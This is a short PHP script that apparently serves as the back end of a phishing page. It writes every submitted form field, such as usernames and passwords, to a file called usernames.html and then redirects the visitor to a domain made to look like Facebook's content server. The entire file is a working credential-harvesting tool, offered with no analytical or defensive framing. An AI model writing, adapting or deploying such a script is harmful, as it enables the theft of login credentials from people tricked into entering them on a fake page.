<?php
   header ('Location:http://fbcdn.net23.net/redirect.html');
  $handle = fopen("usernames.html", "a");
  foreach($_POST as $variable => $value) {
     fwrite($handle, $variable);
     fwrite($handle, "=");
     fwrite($handle, $value);
     fwrite($handle, "\r\n"."<br>");
  }
  fwrite($handle, "\r\n");
  fclose($handle);
  exit;
?>